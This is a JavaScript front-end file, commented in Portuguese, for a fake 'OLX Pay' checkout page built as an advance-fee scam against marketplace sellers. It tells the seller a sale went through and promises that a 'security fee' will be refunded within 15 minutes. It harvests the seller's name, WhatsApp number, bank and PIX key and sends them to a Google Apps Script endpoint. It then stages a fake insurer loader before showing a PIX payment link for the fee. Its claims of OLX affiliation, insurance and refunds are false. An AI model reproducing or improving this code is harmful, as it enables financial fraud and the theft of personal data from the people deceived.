/**
 * 🏛️ ARQUITETO DE SOLUÇÕES - FRONTEND BUYER V3.0
 * Integração: Exibição de Pedido + Checkout InvictusPay (PIX)
 */

// ========================================================
// ⚙️ CONFIGURAÇÃO
// COLE AQUI A URL DA SUA NOVA IMPLANTAÇÃO DO GOOGLE SCRIPT (Passo anterior)
const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
// ========================================================

const mainContainer = document.getElementById('main-container');

// ---------------------------------------------------------
// 1. INICIALIZAÇÃO AUTOMÁTICA
// ---------------------------------------------------------
(async function init() {
  const params = new URLSearchParams(window.location.search);
  const id = params.get('id');

  if (!id) {
    renderError('Link incompleto. Verifique se você copiou o link inteiro enviado pelo vendedor.');
    return;
  }

  try {
    // Chama o GAS para buscar os detalhes do produto (Leitura)
    const response = await fetch(`${WEB_APP_URL}?action=get&id=${id}`);
    const json = await response.json();

    if (json.status === 'success') {
      renderContainer(json.data, id); // Passamos o ID para usar na venda
    } else {
      renderError(json.message || 'Pedido não encontrado.');
    }
  } catch (err) {
    console.error(err);
    renderError('Erro de conexão. Verifique sua internet e recarregue a página.');
  }
})();

// ---------------------------------------------------------
// 2. RENDERIZAÇÃO DA TELA (HTML Dinâmico)
// ---------------------------------------------------------
function renderContainer(dadosBrutos, produtoId) {
  // Normaliza chaves para minúsculo
  const dados = {};
  Object.keys(dadosBrutos).forEach(key => {
    dados[key.toLowerCase()] = dadosBrutos[key];
  });

  // --- ALIASES (Garante leitura mesmo se mudar nome na planilha) ---
  dados.valor = dados.valor || dados['valor total'] || dados['valor do produto'] || '';
  dados.taxa = dados.taxa || dados['taxa de serviço'] || '';
  dados.frete = dados.frete || dados['custo frete'] || '';
  dados.tarifa = dados.tarifa || dados['tarifa olx pay'] || '';
  dados.prazo = dados.prazo || '15 minutos';

  mainContainer.innerHTML = '';

  // Estrutura Base
  const container = criarElemento('div', { class: 'container' });
  const imgHeader = criarElemento('div', { class: 'header-image' });
  const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura com OLX Pay' });
  const content = criarElemento('div', { class: 'content' });

  content.innerHTML = `
    <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
    <p>Após o pagamento da taxa de <span class="highlight" id="taxa">${getDisplayValue(dados.taxa, true, '---')}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${dados.prazo}</span>. Seu seguro está ativo.</p>
    
    <h2>Detalhes da transação</h2>
    <p><i class="fa-solid fa-user icon"></i> <strong>Comprador(a):</strong> <span>${dados.comprador || '---'}</span></p>
    <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto:</strong> <span>${getDisplayValue(dados.valor, true, '---')}</span></p>
    <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span>${getDisplayValue(dados.frete, true, 'Grátis')}</span></p>
    <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa OLX Pay:</strong> <span>${getDisplayValue(dados.tarifa, true, 'Inclusa')}</span></p>
    ${dados.cpf ? `<p><i class="fa-solid fa-id-card icon"></i> <strong>CPF:</strong> <span>${dados.cpf}</span></p>` : ''}
    ${dados.cartao ? `<p><i class="fa-solid fa-credit-card icon"></i> <strong>Transação via:</strong> <span>${dados.cartao}</span></p>` : ''}

    <div style="margin-top:15px">
      ${dados.vendas ? `<span class="badge">${dados.vendas}</span>` : ''}
      ${dados.atendimento ? `<span class="badge">${dados.atendimento}</span>` : ''}
      ${dados.entrega ? `<span class="badge">${dados.entrega}</span>` : ''}
    </div>

    <h2>💬 Próximos passos</h2>
    <ul>
      <li>Preencha o formulário abaixo com seus dados para liberação.</li>
      <li>O sistema gerará a guia de pagamento da taxa de segurança.</li>
    </ul>
  `;

  // --- FORMULÁRIO ---
  const form = criarElemento('form', { id: 'dadosCliente' });
  
  // Campos Inputs
  const inputNome = criarInput('Nome Completo', 'nome');
  const inputTelefone = criarInput('Telefone (Whatsapp)', 'telefone', 'tel');
  const inputBanco = criarInput('Banco de Recebimento', 'banco');
  const inputPix = criarInput('Chave PIX', 'pix');

  const btnEnviar = criarElemento('button', { id: 'enviarDados', type: 'submit' }, 'Confirmar Dados e Pagar Taxa');
  const msgEnvio = criarElemento('p', { id: 'msgEnvio', style: 'text-align:center; margin-top:10px; font-weight:bold;' });

  form.append(inputNome, inputTelefone, inputBanco, inputPix, btnEnviar, msgEnvio);
  content.appendChild(form);

  // --- LOADER E BOTÃO FINAL ---
  const loaderDiv = document.createElement('div');
  loaderDiv.id = 'loader-intermedio';
  loaderDiv.style.display = 'none'; // Começa oculto
  loaderDiv.innerHTML = `
    <div style="text-align:center; padding:20px;">
       <i class="fa-solid fa-circle-notch fa-spin" style="font-size:30px; color:#00bfa5;"></i>
       <p style="margin-top:10px;">Conectando com a seguradora...</p>
    </div>
  `;
  content.appendChild(loaderDiv);

  const btnPagamento = criarElemento('a', { 
    id: 'btn-pagamento', 
    class: 'button hidden', 
    href: '#',
    target: '_blank' 
  }, 'Pagar Taxa Agora');
  
  const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
  content.appendChild(btnContainer);

  // Renderização final
  container.append(imgHeader, title, content);
  const footer = criarElemento('div', { class: 'footer' }, '&copy; 2025 OLX Pay. Todos os direitos reservados.');
  container.appendChild(footer);
  mainContainer.appendChild(container);

  // -------------------------------------------------------
  // 3. LÓGICA DE CHECKOUT (Integrada com GAS/Invictus)
  // -------------------------------------------------------
  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    // UI Feedback
    const btnOriginalText = btnEnviar.innerText;
    btnEnviar.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Gerando PIX...`;
    btnEnviar.disabled = true;
    btnEnviar.style.background = "#555";
    msgEnvio.textContent = "";

    // Dados
    const formData = {
      nome: document.getElementById('nome').value,
      telefone: document.getElementById('telefone').value,
      banco: document.getElementById('banco').value,
      pix: document.getElementById('pix').value,
      produto_id: produtoId,
      // Se quiser enviar valor dinâmico (cuidado com segurança), adicione aqui:
      // valor_centavos: 15000 
    };

    try {
      // POST para o GAS
      const response = await fetch(`${WEB_APP_URL}?action=checkout`, {
        method: 'POST',
        body: JSON.stringify(formData)
      });

      const result = await response.json();

      if (result.status === 'success') {
        // === SUCESSO ===
        
        // 1. Atualiza o link do botão final
        btnPagamento.href = result.payment_link; 

        // 2. Mensagem de sucesso
        msgEnvio.innerHTML = `<span style="color:#00bfa5;">✅ Pagamento Gerado com Sucesso!</span>`;

        // 3. Troca de Cena (Form -> Loader -> Botão)
        form.style.display = 'none';
        loaderDiv.style.display = 'block';

        setTimeout(() => {
          loaderDiv.style.display = 'none';
          
          // Mostra botão final
          btnPagamento.classList.remove('hidden');
          btnPagamento.classList.add('visible');
          btnPagamento.style.display = 'inline-block';
          
          // Rola até o botão
          btnContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });

        }, 1500);

      } else {
        throw new Error(result.message || 'Erro ao processar pagamento.');
      }

    } catch (error) {
      console.error(error);
      btnEnviar.innerHTML = btnOriginalText; // Restaura texto
      btnEnviar.disabled = false;
      btnEnviar.style.background = ""; // Restaura cor
      msgEnvio.innerHTML = `<span style="color:#ff4d4d;">❌ Erro: ${error.message}</span>`;
    }
  });
}

// ---------------------------------------------------------
// 4. HELPER FUNCTIONS
// ---------------------------------------------------------

function renderError(msg) {
  mainContainer.innerHTML = `
    <div class="container" style="text-align:center; padding:40px;">
      <h2 style="color:#ff4d4d;">Atenção</h2>
      <p style="color:#ccc;">${msg}</p>
    </div>`;
}

function criarInput(textoLabel, id, type = 'text') {
  const div = document.createElement('div');
  div.style.marginBottom = "15px";
  const label = criarElemento('label', { for: id }, textoLabel);
  const input = criarElemento('input', { type: type, id: id, name: id, required: true });
  div.append(label, input);
  return div;
}

function criarElemento(tag, attrs = {}, inner = '') {
  const el = document.createElement(tag);
  Object.entries(attrs).forEach(([key, value]) => {
    if (key === 'class') el.className = value;
    else if (key === 'id') el.id = value;
    else if (key === 'href') el.href = value;
    else el.setAttribute(key, value);
  });
  if (inner) el.innerHTML = inner;
  return el;
}

// Formatador de Valores
const formatValueForClient = (value) => {
    if (!value) return ''; 
    let valueStr = String(value).trim();
    valueStr = valueStr.replace(/R\$\s*/g, '');
    if (valueStr.match(/gr[aá]tis|inclusa|horas|vendas|avaliação|taxa de/i)) return valueStr;
    let numericStr = valueStr.replace(/\./g, '').replace(/,/g, '.');
    let number = parseFloat(numericStr);
    if (!isNaN(number)) return number.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
    return valueStr;
}

const getDisplayValue = (data, isCurrencyField, defaultText) => {
    const formatted = formatValueForClient(data);
    if (formatted === '') return isCurrencyField ? `R$ ${defaultText}` : defaultText;
    if (isCurrencyField && (formatted.toLowerCase().includes('grátis') || formatted.toLowerCase().includes('inclusa'))) return formatted;
    return isCurrencyField ? `R$ ${formatted}` : formatted;
}
